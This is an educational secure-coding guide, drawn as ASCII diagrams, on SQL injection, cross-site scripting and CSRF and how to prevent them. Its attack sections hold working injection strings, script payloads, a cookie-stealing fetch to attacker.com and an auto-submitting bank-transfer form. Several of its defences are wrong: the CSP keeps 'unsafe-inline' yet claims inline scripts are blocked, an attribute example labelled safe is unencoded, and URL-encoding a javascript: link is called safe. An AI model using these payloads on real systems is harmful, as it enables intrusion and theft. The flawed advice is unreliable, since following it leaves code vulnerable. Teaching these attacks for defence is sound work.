# Application Security - Complete Diagrams Guide (Part 4: Input Validation)

## 🛡️ Input Validation: SQL Injection, XSS, CSRF Prevention

---

## 1. Input Validation Fundamentals

### Input Validation Flow
```
┌─────────────────────────────────────────────────────────────┐
│              Input Validation Pipeline                       │
└─────────────────────────────────────────────────────────────┘

    User Input
    │
    │
    ▼
┌──────────────────┐
│ Sanitization     │
│ - Remove harmful │
│ - Escape special │
│   characters     │
└──────────────────┘
    │
    │
    ▼
┌──────────────────┐
│ Validation       │
│ - Type check     │
│ - Format check   │
│ - Range check    │
│ - Length check   │
└──────────────────┘
    │
    │
    ▼
┌──────────────────┐
│ Whitelist        │
│ - Allowed values │
│ - Allowed format │
└──────────────────┘
    │
    │
    ▼
┌──────────────────┐
│ Context-Specific │
│ - SQL context    │
│ - HTML context   │
│ - URL context    │
│ - JS context     │
└──────────────────┘
    │
    │
    ▼
    Safe Input
    │
    ▼
    Processing
```

### Input Validation Principles
```
┌─────────────────────────────────────────────────────────────┐
│              Input Validation Principles                    │
└─────────────────────────────────────────────────────────────┘

1. Never Trust Input:
   - All input is potentially malicious
   - Validate on server-side (client-side is not enough)
   - Validate at every layer

2. Whitelist Over Blacklist:
   - Define what's allowed, not what's forbidden
   - Blacklists can be bypassed
   - Whitelists are more secure

3. Validate Early:
   - Validate as soon as input is received
   - Fail fast
   - Don't process invalid input

4. Context-Aware Validation:
   - Different contexts need different validation
   - SQL context ≠ HTML context
   - URL context ≠ JavaScript context

5. Defense in Depth:
   - Multiple validation layers
   - Validate at entry point
   - Validate before processing
   - Validate before output
```

---

## 2. SQL Injection

### SQL Injection Attack Flow
```
┌─────────────────────────────────────────────────────────────┐
│              SQL Injection Attack                           │
└─────────────────────────────────────────────────────────────┘

Vulnerable Code:
    String query = "SELECT * FROM users WHERE username = '" 
                   + username + "'";
    
    Input: username = "admin' OR '1'='1"
    
    Resulting Query:
    SELECT * FROM users WHERE username = 'admin' OR '1'='1'
    
    This returns ALL users!

Attack Flow:
    Attacker ──► Application: 
        username = "admin' OR '1'='1'--"
    
    Application:
        1. Receives input
        2. Concatenates into SQL query
        3. Executes query
        4. Returns all users
    
    Attacker ◄── Application: All user data
```

### SQL Injection Types

#### Classic SQL Injection
```
┌─────────────────────────────────────────────────────────────┐
│              Classic SQL Injection                          │
└─────────────────────────────────────────────────────────────┘

Vulnerable Query:
    SELECT * FROM users WHERE id = $id

Attack 1: Bypass Authentication
    Input: id = "1 OR 1=1"
    Query: SELECT * FROM users WHERE id = 1 OR 1=1
    Result: Returns all users

Attack 2: Union-Based
    Input: id = "1 UNION SELECT username, password FROM users"
    Query: SELECT * FROM users WHERE id = 1 
           UNION SELECT username, password FROM users
    Result: Returns usernames and passwords

Attack 3: Comment Out
    Input: id = "1'--"
    Query: SELECT * FROM users WHERE id = '1'--'
    Result: Comment out rest of query

Attack 4: Boolean-Based Blind
    Input: id = "1 AND 1=1"
    Query: SELECT * FROM users WHERE id = 1 AND 1=1
    Result: True condition, returns data
    
    Input: id = "1 AND 1=2"
    Query: SELECT * FROM users WHERE id = 1 AND 1=2
    Result: False condition, no data
    (Attacker can infer database structure)
```

#### Time-Based Blind SQL Injection
```
┌─────────────────────────────────────────────────────────────┐
│              Time-Based Blind SQL Injection                 │
└─────────────────────────────────────────────────────────────┘

Attack:
    Input: id = "1 AND IF(1=1, SLEEP(5), 0)"
    Query: SELECT * FROM users WHERE id = 1 
           AND IF(1=1, SLEEP(5), 0)
    Result: Query takes 5 seconds
    
    Input: id = "1 AND IF(1=2, SLEEP(5), 0)"
    Query: SELECT * FROM users WHERE id = 1 
           AND IF(1=2, SLEEP(5), 0)
    Result: Query executes immediately
    
    Attacker can infer:
    - Database structure
    - Data values
    - By measuring response time
```

### SQL Injection Prevention

#### Parameterized Queries (Prepared Statements)
```
┌─────────────────────────────────────────────────────────────┐
│              Parameterized Queries                          │
└─────────────────────────────────────────────────────────────┘

Vulnerable (String Concatenation):
    String query = "SELECT * FROM users WHERE username = '" 
                   + username + "'";
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    
    Problem: Input directly in query
    Attack: username = "admin' OR '1'='1"

Secure (Parameterized):
    String query = "SELECT * FROM users WHERE username = ?";
    PreparedStatement stmt = conn.prepareStatement(query);
    stmt.setString(1, username);
    ResultSet rs = stmt.executeQuery();
    
    How it works:
    1. Query template prepared
    2. Parameters bound separately
    3. Database treats parameters as data, not code
    4. Even if input = "admin' OR '1'='1", 
       it's treated as literal string
    
    Result: SQL injection prevented
```

#### Input Validation
```
┌─────────────────────────────────────────────────────────────┐
│              Input Validation for SQL                       │
└─────────────────────────────────────────────────────────────┘

Validation Rules:
    ┌──────────────────┐
    │ Whitelist        │
    │ - Allowed chars  │
    │ - No SQL keywords│
    │ - Length limits  │
    └──────────────────┘
         │
         │
         ▼
    Input: username
    Rules:
    - Only alphanumeric + underscore
    - Max length: 50
    - No special characters
    - No SQL keywords (SELECT, UNION, etc.)
    
    Example:
    Valid: "john_doe123"
    Invalid: "admin' OR '1'='1"
    Invalid: "admin; DROP TABLE users--"
```

#### Least Privilege Database Access
```
┌─────────────────────────────────────────────────────────────┐
│              Database Access Control                         │
└─────────────────────────────────────────────────────────────┘

Principle: Application should use database user with 
           minimum required permissions

    Application
    │
    │ Database User: app_user
    │ Permissions:
    │   - SELECT on users table
    │   - INSERT on users table
    │   - UPDATE on users table
    │   - NO DROP, ALTER, CREATE
    │
    ▼
    Database
    
    Even if SQL injection occurs:
    - Cannot drop tables
    - Cannot alter schema
    - Cannot access other databases
    - Limited to allowed operations
```

---

## 3. Cross-Site Scripting (XSS)

### XSS Attack Types

#### Stored XSS
```
┌─────────────────────────────────────────────────────────────┐
│              Stored XSS Attack                              │
└─────────────────────────────────────────────────────────────┘

Step 1: Attacker Injects Malicious Script
    Attacker ──► Application:
        POST /comment
        comment = "<script>alert('XSS')</script>"
    
    Application:
        - Stores comment in database
        - No sanitization
        - Comment saved

Step 2: Victim Views Page
    Victim ──► Application: GET /comments
    
    Application:
        - Retrieves comments from database
        - Renders: <div><script>alert('XSS')</script></div>
        - Browser executes script

Step 3: Script Executes
    Browser executes:
        alert('XSS')
        // Or worse:
        document.cookie
        // Send to attacker's server
        fetch('http://attacker.com/steal?cookie=' + document.cookie)
```

#### Reflected XSS
```
┌─────────────────────────────────────────────────────────────┐
│              Reflected XSS Attack                            │
└─────────────────────────────────────────────────────────────┘

Step 1: Attacker Creates Malicious Link
    Attacker creates:
    https://example.com/search?q=<script>alert('XSS')</script>
    
    Attacker sends link to victim:
    "Check out this cool search!"

Step 2: Victim Clicks Link
    Victim ──► Application:
        GET /search?q=<script>alert('XSS')</script>
    
    Application:
        - Receives query parameter
        - Renders: <div>You searched for: <script>alert('XSS')</script></div>
        - No sanitization
        - Script in response

Step 3: Script Executes
    Browser executes script
    Attacker can:
    - Steal cookies
    - Redirect to malicious site
    - Perform actions as user
```

#### DOM-Based XSS
```
┌─────────────────────────────────────────────────────────────┐
│              DOM-Based XSS Attack                            │
└─────────────────────────────────────────────────────────────┘

Vulnerable JavaScript:
    <script>
        var name = new URLSearchParams(window.location.search)
                      .get('name');
        document.getElementById('greeting').innerHTML = 
            'Hello, ' + name;
    </script>
    
Attack:
    URL: https://example.com?name=<script>alert('XSS')</script>
    
    JavaScript:
        name = "<script>alert('XSS')</script>"
        innerHTML = 'Hello, <script>alert('XSS')</script>'
    
    Result: Script executes in browser
```

### XSS Prevention

#### Output Encoding
```
┌─────────────────────────────────────────────────────────────┐
│              Output Encoding                                 │
└─────────────────────────────────────────────────────────────┘

Context: HTML Body
    Input: <script>alert('XSS')</script>
    Encoded: &lt;script&gt;alert('XSS')&lt;/script&gt;
    Rendered: <script>alert('XSS')</script> (as text, not executed)

Context: HTML Attribute
    Input: " onclick="alert('XSS')"
    Encoded: &quot; onclick=&quot;alert('XSS')&quot;
    Safe: <div class=" onclick="alert('XSS')"></div>

Context: JavaScript
    Input: '; alert('XSS'); //
    Encoded: \'; alert(\'XSS\'); \/\/ 
    Safe: var name = '\'; alert(\'XSS\'); \/\/';

Context: URL
    Input: javascript:alert('XSS')
    Encoded: javascript%3Aalert%28%27XSS%27%29
    Safe: <a href="javascript%3Aalert%28%27XSS%27%29">Link</a>
```

#### Content Security Policy (CSP)
```
┌─────────────────────────────────────────────────────────────┐
│              Content Security Policy                        │
└─────────────────────────────────────────────────────────────┘

CSP Header:
    Content-Security-Policy: 
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self';
        font-src 'self';
        object-src 'none';
        media-src 'self';
        frame-src 'none';
        base-uri 'self';
        form-action 'self';
        upgrade-insecure-requests;

How it works:
    Browser checks CSP before executing:
    - Scripts from allowed sources only
    - Inline scripts blocked (unless 'unsafe-inline')
    - External resources from allowed domains
    - Prevents XSS even if input not sanitized

Example:
    <script>alert('XSS')</script>
    Browser: Blocked by CSP (inline script not allowed)
```

#### Input Sanitization
```
┌─────────────────────────────────────────────────────────────┐
│              Input Sanitization                             │
└─────────────────────────────────────────────────────────────┘

Library: DOMPurify (JavaScript)
    import DOMPurify from 'dompurify';
    
    const clean = DOMPurify.sanitize(dirty);
    
    Input: <script>alert('XSS')</script>
    Output: (empty, script removed)
    
    Input: <p>Hello <strong>World</strong></p>
    Output: <p>Hello <strong>World</strong></p> (allowed tags)

Library: OWASP Java HTML Sanitizer
    PolicyFactory policy = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS);
    String safe = policy.sanitize(input);
    
    Removes:
    - Script tags
    - Event handlers (onclick, onerror, etc.)
    - JavaScript: URLs
    - Dangerous attributes
```

---

## 4. Cross-Site Request Forgery (CSRF)

### CSRF Attack Flow
```
┌─────────────────────────────────────────────────────────────┐
│              CSRF Attack Flow                               │
└─────────────────────────────────────────────────────────────┘

Step 1: User Logs into Bank
    User ──► Bank: Login
    Bank ──► User: Session Cookie Set
    User: Authenticated, cookie stored

Step 2: User Visits Attacker's Site
    User ──► Attacker Site: Visit (while still logged into bank)
    
    Attacker Site contains:
    <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>document.forms[0].submit();</script>

Step 3: Browser Sends Request
    Browser automatically:
    - Includes bank session cookie
    - Sends POST request to bank
    - Bank sees valid session
    - Bank processes transfer

Step 4: Money Transferred
    Bank ──► Attacker: $10,000 transferred
    User: Unaware of attack
```

### CSRF Prevention

#### CSRF Tokens
```
┌─────────────────────────────────────────────────────────────┐
│              CSRF Token Protection                           │
└─────────────────────────────────────────────────────────────┘

Step 1: Server Generates Token
    User ──► Application: GET /form
    Application:
        - Generates random CSRF token
        - Stores in session: session.csrf_token = "abc123"
        - Includes in form: <input type="hidden" name="csrf_token" value="abc123">

Step 2: Form Submission
    User ──► Application: POST /submit
        csrf_token = "abc123"
        form_data = {...}
    
    Application:
        - Retrieves token from session
        - Compares with submitted token
        - If match: Process request
        - If no match: Reject (403 Forbidden)

Step 3: Attacker Cannot Get Token
    Attacker ──► Application: GET /form
    Application: Returns form, but attacker cannot read token
    (Same-Origin Policy prevents reading response)
    
    Attacker's form:
        <form action="https://bank.com/transfer">
            <input name="csrf_token" value="???">  ← Unknown
        </form>
    
    Result: CSRF attack fails (invalid token)
```

#### SameSite Cookies
```
┌─────────────────────────────────────────────────────────────┐
│              SameSite Cookie Attribute                      │
└─────────────────────────────────────────────────────────────┘

Cookie Setting:
    Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

SameSite Values:

1. Strict:
    Cookie only sent in same-site requests
    Example: User on bank.com → cookie sent
             User on attacker.com → cookie NOT sent
    
    Pros: Maximum protection
    Cons: May break legitimate cross-site flows

2. Lax:
    Cookie sent in same-site requests
    Cookie sent in top-level navigation (GET)
    Cookie NOT sent in cross-site POST
    
    Example:
    - User clicks link: bank.com → cookie sent
    - Form POST from attacker.com → cookie NOT sent
    
    Pros: Good protection, better UX
    Cons: Some edge cases

3. None:
    Cookie always sent (requires Secure flag)
    Use case: Cross-site iframes, third-party integrations
```

#### Double Submit Cookie
```
┌─────────────────────────────────────────────────────────────┐
│              Double Submit Cookie Pattern                   │
└─────────────────────────────────────────────────────────────┘

Step 1: Set Cookie
    Application sets cookie:
    Set-Cookie: csrf_token=abc123; SameSite=Lax; Secure

Step 2: Include in Form
    Form includes:
    <input type="hidden" name="csrf_token" value="abc123">
    
    (Same value in cookie and form)

Step 3: Validate on Submit
    Application:
        - Reads csrf_token from cookie
        - Reads csrf_token from form
        - Compares both values
        - If match: Valid request
        - If no match: CSRF attack

Why it works:
    - Attacker can set cookie (but different domain)
    - Attacker cannot read cookie (Same-Origin Policy)
    - Attacker's cookie won't match form value
    - Attack fails
```

---

## 5. Input Validation Best Practices

### Validation Checklist
```
┌─────────────────────────────────────────────────────────────┐
│              Input Validation Checklist                      │
└─────────────────────────────────────────────────────────────┘

SQL Injection Prevention:
    ✓ Use parameterized queries
    ✓ Validate input types
    ✓ Whitelist allowed characters
    ✓ Use least privilege database users
    ✓ Escape special characters
    ✓ Use ORM frameworks

XSS Prevention:
    ✓ Encode output based on context
    ✓ Use Content Security Policy
    ✓ Sanitize HTML input
    ✓ Avoid innerHTML, use textContent
    ✓ Validate URLs before redirect
    ✓ Use template engines with auto-escaping

CSRF Prevention:
    ✓ Use CSRF tokens
    ✓ Set SameSite cookie attribute
    ✓ Verify Origin/Referer headers
    ✓ Use double submit cookie pattern
    ✓ Require re-authentication for sensitive operations

General:
    ✓ Validate on server-side (never trust client)
    ✓ Use whitelist validation
    ✓ Validate type, format, length, range
    ✓ Sanitize before processing
    ✓ Encode before output
    ✓ Log validation failures
    ✓ Return generic error messages
```

---

## Key Takeaways

### Input Validation Summary
```
┌─────────────────────────────────────────────────────────────┐
│              Defense Strategy                                │
└─────────────────────────────────────────────────────────────┘

Layer 1: Input Validation
    - Type checking
    - Format validation
    - Length limits
    - Whitelist allowed values

Layer 2: Sanitization
    - Remove dangerous characters
    - Escape special characters
    - Context-aware sanitization

Layer 3: Parameterized Queries
    - Prepared statements
    - Parameter binding
    - No string concatenation

Layer 4: Output Encoding
    - Context-aware encoding
    - HTML encoding
    - JavaScript encoding
    - URL encoding

Layer 5: Security Headers
    - Content Security Policy
    - SameSite cookies
    - X-Frame-Options
```

---

**Next: Part 5 will cover Secure Coding (OWASP Top 10, Secure Coding Practices).**

